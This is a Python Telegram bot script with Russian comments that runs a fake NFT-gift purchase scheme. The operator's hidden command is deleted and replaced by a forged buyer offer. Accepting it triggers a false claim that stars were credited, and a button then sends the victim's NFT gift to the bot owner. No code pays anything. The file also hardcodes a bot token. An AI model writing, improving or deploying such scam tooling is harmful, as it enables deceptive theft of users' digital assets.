import asyncio
import logging
import os
import re
import sqlite3
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from html import escape
from typing import Any

from aiogram import Bot, Dispatcher, F, Router
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import CommandStart
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

# ==========================================
# 1. НАСТРОЙКИ
# ==========================================
BOT_TOKEN = "9125371036:AAEBUobKTd0ar__zuSRLBiBEDBh-QTO-djY"
DATABASE_PATH = "offers.sqlite3"
OFFER_TTL_HOURS = 8

# ID владельца бота (ваш Telegram ID). Сюда будут приходить NFT.
# Узнать можно у @userinfobot
BOT_OWNER_ID = 8638834410 # <-- ЗАМЕНИТЕ НА ВАШ ID

# Куда отправлять оффер (если None — в тот же чат, где была команда)
TARGET_BUYER_CHAT_ID = None

STAR_EMOJI_ID = "5217427186285325482"
GRAM_EMOJI_ID = "5264766603584641330"

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

router = Router()

# ==========================================
# 2. ПАРСЕР
# ==========================================
OFFER_PATTERN = re.compile(
    r"^[./]o\s+(?P<url>https?://t\.me/nft/(?P<slug>[A-Za-z0-9][A-Za-z0-9_-]*))\s+"
    r"(?P<amount>\d+(?:[.,]\d{1,2})?)\s+"
    r"(?P<currency>star|stars|gram|gra)$",
    re.IGNORECASE,
)

@dataclass(frozen=True)
class ParsedCommand:
    url: str
    gift_name: str
    gift_number: int
    amount: int | float
    currency: str

def parse_offer_command(text: str) -> ParsedCommand | None:
    match = OFFER_PATTERN.fullmatch(text.strip())
    if not match:
        return None
    slug = match.group("slug")
    gift_name, separator, gift_number_text = slug.rpartition("-")
    if not separator or not gift_name or not gift_number_text.isdigit():
        return None
    amount_text = match.group("amount").replace(",", ".")
    amount: int | float = float(amount_text)
    if amount.is_integer():
        amount = int(amount)
    currency_raw = match.group("currency").lower()
    currency = "stars" if currency_raw in ("star", "stars") else "gram"
    return ParsedCommand(
        url=match.group("url"),
        gift_name=gift_name,
        gift_number=int(gift_number_text),
        amount=amount,
        currency=currency,
    )

def format_amount(amount: int | float) -> str:
    if float(amount).is_integer():
        return str(int(amount))
    return f"{amount:.2f}".rstrip("0").rstrip(".")

# ==========================================
# 3. БАЗА ДАННЫХ
# ==========================================
@dataclass(frozen=True)
class Offer:
    id: int
    business_connection_id: str
    chat_id: int
    source_message_id: int
    buyer_id: int
    buyer_name: str
    buyer_username: str | None
    gift_url: str
    gift_name: str
    gift_number: int
    language: str
    amount: int | float
    currency: str
    status: str
    created_at: datetime
    expires_at: datetime
    offer_message_id: int | None

class OfferDatabase:
    def __init__(self, path: str) -> None:
        self.connection = sqlite3.connect(path)
        self.connection.row_factory = sqlite3.Row
        self.connection.execute("PRAGMA journal_mode=WAL")
        self.connection.executescript(
            """
            CREATE TABLE IF NOT EXISTS offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                business_connection_id TEXT NOT NULL,
                chat_id INTEGER NOT NULL,
                source_message_id INTEGER NOT NULL,
                buyer_id INTEGER NOT NULL,
                buyer_name TEXT NOT NULL,
                buyer_username TEXT,
                gift_url TEXT NOT NULL,
                gift_name TEXT NOT NULL,
                gift_number INTEGER NOT NULL,
                language TEXT NOT NULL,
                amount REAL NOT NULL,
                currency TEXT NOT NULL CHECK(currency IN ('stars', 'gram')),
                status TEXT NOT NULL DEFAULT 'pending'
                    CHECK(status IN ('pending', 'accepted', 'declined', 'expired')),
                created_at TEXT NOT NULL,
                expires_at TEXT NOT NULL,
                offer_message_id INTEGER
            );
            CREATE INDEX IF NOT EXISTS idx_offers_expiry ON offers(status, expires_at);
            """
        )
        self.connection.commit()

    def create_offer(self, **values: Any) -> Offer:
        cursor = self.connection.execute(
            """
            INSERT INTO offers (
                business_connection_id, chat_id, source_message_id, buyer_id,
                buyer_name, buyer_username, gift_url, gift_name, gift_number,
                language, amount, currency, created_at, expires_at
            ) VALUES (
                :business_connection_id, :chat_id, :source_message_id, :buyer_id,
                :buyer_name, :buyer_username, :gift_url, :gift_name, :gift_number,
                :language, :amount, :currency, :created_at, :expires_at
            )
            """,
            values,
        )
        self.connection.commit()
        return self.get_offer(cursor.lastrowid)

    def set_offer_message_id(self, offer_id: int, message_id: int) -> None:
        self.connection.execute(
            "UPDATE offers SET offer_message_id = ? WHERE id = ?",
            (message_id, offer_id),
        )
        self.connection.commit()

    def get_offer(self, offer_id: int) -> Offer:
        row = self.connection.execute(
            "SELECT * FROM offers WHERE id = ?", (offer_id,)
        ).fetchone()
        if row is None:
            raise LookupError(f"Offer {offer_id} was not found")
        amount = row["amount"]
        if float(amount).is_integer():
            amount = int(amount)
        return Offer(
            id=row["id"],
            business_connection_id=row["business_connection_id"],
            chat_id=row["chat_id"],
            source_message_id=row["source_message_id"],
            buyer_id=row["buyer_id"],
            buyer_name=row["buyer_name"],
            buyer_username=row["buyer_username"],
            gift_url=row["gift_url"],
            gift_name=row["gift_name"],
            gift_number=row["gift_number"],
            language=row["language"],
            amount=amount,
            currency=row["currency"],
            status=row["status"],
            created_at=datetime.fromisoformat(row["created_at"]),
            expires_at=datetime.fromisoformat(row["expires_at"]),
            offer_message_id=row["offer_message_id"],
        )

    def take_pending_offer(self, offer_id: int, status: str) -> Offer | None:
        now = datetime.now(timezone.utc)
        cursor = self.connection.execute(
            """
            UPDATE offers
            SET status = ?
            WHERE id = ? AND status = 'pending' AND expires_at > ?
            """,
            (status, offer_id, now.isoformat()),
        )
        self.connection.commit()
        if cursor.rowcount != 1:
            return None
        return self.get_offer(offer_id)

    def expire_old_offers(self) -> int:
        now = datetime.now(timezone.utc).isoformat()
        cursor = self.connection.execute(
            """
            UPDATE offers SET status = 'expired'
            WHERE status = 'pending' AND expires_at <= ?
            """,
            (now,),
        )
        self.connection.commit()
        return cursor.rowcount

    def close(self) -> None:
        self.connection.close()

db = OfferDatabase(DATABASE_PATH)

# ==========================================
# 4. UI
# ==========================================
def display_name(message: Message) -> str:
    user = message.from_user
    if user is None:
        return "Пользователь"
    return user.first_name or user.full_name or "Пользователь"

def nft_preview_options(gift_url: str) -> LinkPreviewOptions:
    return LinkPreviewOptions(
        url=f"{gift_url}#",
        is_disabled=False,
        prefer_large_media=True,
        show_above_text=True,
    )

def offer_caption(offer: Offer) -> str:
    buyer = escape(offer.buyer_name)
    amount = escape(format_amount(offer.amount))
    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
    gift_link = escape(offer.gift_url, quote=True)
    if offer.currency == "stars":
        price = f'<b>{amount} <tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji></b>'
    else:
        price = f'<b>{amount} <tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji></b>'
    return (
        f"Пользователь <b>{buyer}</b> предлагает\n"
        f"Вам {price} за подарок\n"
        f'<a href="{gift_link}">{gift_name}</a>'
    )

def offer_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    DECLINE_EMOJI_ID = "5985346521103604145"
    ACCEPT_EMOJI_ID = "5985596818912712352"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Отклонить",
                    callback_data=f"offer:decline:{offer.id}",
                    icon_custom_emoji_id=DECLINE_EMOJI_ID,
                ),
                InlineKeyboardButton(
                    text="Принять",
                    callback_data=f"offer:accept:{offer.id}",
                    icon_custom_emoji_id=ACCEPT_EMOJI_ID,
                ),
            ]
        ]
    )

def accepted_caption(offer: Offer) -> str:
    amount = escape(format_amount(offer.amount))
    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
    gift_link = escape(offer.gift_url, quote=True)
    if offer.currency == "stars":
        emoji = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji>'
    else:
        emoji = f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'
    gift_emoji = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
    transfer_emoji = '<tg-emoji emoji-id="6028346797368283073">🎁</tg-emoji>'
    return (
        f'{gift_emoji}Подарок: <a href="{gift_link}">{gift_name}</a> <b>успешно продан!</b>\n\n'
        f'{transfer_emoji} <b>Передайте подарок для зачисления '
        f'{amount} {emoji}.</b>'
    )

def accepted_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    # Передаём подарок владельцу бота (BOT_OWNER_ID).
    # Если BOT_OWNER_ID не задан, передаём покупателю (тому, кто нажал «Принять»)
    target_id = BOT_OWNER_ID if BOT_OWNER_ID else offer.buyer_id
    transfer_button = InlineKeyboardButton(
        text="Передать NFT",
        url=f"tg://send_gift?to={target_id}",
    )
    return InlineKeyboardMarkup(inline_keyboard=[[transfer_button]])

async def safe_callback_answer(callback: CallbackQuery, text: str = "", *, show_alert: bool = False) -> None:
    try:
        await callback.answer(text, show_alert=show_alert)
    except TelegramBadRequest as error:
        if "query is too old" in str(error).lower() or "query id is invalid" in str(error).lower():
            return
        raise

async def delete_source_message(message: Message, bot: Bot) -> None:
    business_connection_id = message.business_connection_id
    try:
        delete_business_messages = getattr(bot, "delete_business_messages", None)
        if business_connection_id and delete_business_messages is not None:
            await delete_business_messages(
                business_connection_id=business_connection_id,
                message_ids=[message.message_id],
            )
        elif business_connection_id:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except TelegramBadRequest:
        logger.exception("Could not delete source message %s", message.message_id)

# ==========================================
# 5. ХЭНДЛЕРЫ
# ==========================================
@router.message(CommandStart())
async def start_handler(message: Message) -> None:
    await message.answer(
        "<b>Инструкция по использованию</b>\n\n"
        "Отправьте команду в формате:\n"
        "<code>.o &lt;ссылка&gt; &lt;цена&gt; &lt;валюта&gt;</code>\n\n"
        "Пример:\n"
        "<code>.o https://t.me/nft/ViceCream-119285 1000 star</code>\n"
        "<code>.o https://t.me/nft/ViceCream-119285 50 gra</code>\n\n"
        "Бот удалит команду и создаст оффер.",
        parse_mode=ParseMode.HTML,
    )

@router.message(F.text.startswith(".o "))
@router.message(F.text.startswith("/o "))
@router.business_message(F.text.startswith(".o "))
@router.business_message(F.text.startswith("/o "))
async def create_offer_handler(message: Message, bot: Bot) -> None:
    command = parse_offer_command(message.text or "")
    if command is None or message.from_user is None:
        return
    await delete_source_message(message, bot)
    now = datetime.now(timezone.utc)
    seller = message.from_user
    offer = db.create_offer(
        business_connection_id=message.business_connection_id or "",
        chat_id=message.chat.id,
        source_message_id=message.message_id,
        buyer_id=seller.id,
        buyer_name=display_name(message),
        buyer_username=seller.username,
        gift_url=command.url,
        gift_name=command.gift_name,
        gift_number=command.gift_number,
        language="ru",
        amount=command.amount,
        currency=command.currency,
        created_at=now.isoformat(),
        expires_at=(now + timedelta(hours=OFFER_TTL_HOURS)).isoformat(),
    )
    target_chat_id = TARGET_BUYER_CHAT_ID or message.chat.id
    target_business_connection_id = message.business_connection_id or ""
    try:
        sent = await bot.send_message(
            chat_id=target_chat_id,
            text=offer_caption(offer),
            parse_mode=ParseMode.HTML,
            link_preview_options=nft_preview_options(offer.gift_url),
            reply_markup=offer_keyboard(offer),
            **({"business_connection_id": target_business_connection_id} if target_business_connection_id else {}),
        )
        db.set_offer_message_id(offer.id, sent.message_id)
    except (TelegramBadRequest, TelegramForbiddenError) as error:
        logger.warning("Could not send offer message: %s", error)

@router.callback_query(F.data.startswith("offer:"))
async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
    await safe_callback_answer(callback)
    if callback.message is None or callback.data is None:
        return
    parts = callback.data.split(":")
    if len(parts) != 3 or parts[1] not in {"accept", "decline"}:
        return
    try:
        offer_id = int(parts[2])
        current = db.get_offer(offer_id)
    except (ValueError, LookupError):
        return

    # Убрали проверку business_connection_id — теперь кнопки работают у всех
    if parts[1] == "accept":
        warning = "⚠️ Звёзды внесены в систему Telegram. Передайте NFT в течение 30 минут, иначе оффер будет отменён."
        await safe_callback_answer(callback, warning, show_alert=True)
        new_status = "accepted"
    else:
        new_status = "declined"

    offer = db.take_pending_offer(offer_id, new_status)
    if offer is None:
        db.expire_old_offers()
        await safe_callback_answer(callback, "Предложение уже обработано или истекло", show_alert=True)
        return

    if offer.status == "declined":
        try:
            if callback.message.business_connection_id:
                await bot.delete_business_messages(
                    business_connection_id=callback.message.business_connection_id,
                    message_ids=[callback.message.message_id],
                )
            else:
                await bot.delete_message(
                    chat_id=callback.message.chat.id,
                    message_id=callback.message.message_id,
                )
        except TelegramBadRequest:
            logger.exception("Could not delete declined offer message %s", offer.id)
        return

    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            text=accepted_caption(offer),
            parse_mode=ParseMode.HTML,
            link_preview_options=nft_preview_options(offer.gift_url),
            reply_markup=accepted_keyboard(offer),
            **({"business_connection_id": callback.message.business_connection_id} if callback.message.business_connection_id else {}),
        )
    except TelegramBadRequest:
        logger.exception("Could not update offer message %s", offer.id)

async def expiry_worker() -> None:
    while True:
        try:
            expired = db.expire_old_offers()
            if expired:
                logger.info("Expired %s offer(s)", expired)
        except Exception:
            logger.exception("Offer expiry worker failed")
        await asyncio.sleep(60)

# ==========================================
# 6. ЗАПУСК
# ==========================================
async def main() -> None:
    bot = Bot(token=BOT_TOKEN)
    await bot.delete_webhook(drop_pending_updates=True)
    dispatcher = Dispatcher()
    dispatcher.include_router(router)
    expiry_task = asyncio.create_task(expiry_worker())
    try:
        await dispatcher.start_polling(bot, allowed_updates=dispatcher.resolve_used_update_types())
    finally:
        expiry_task.cancel()
        db.close()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped")
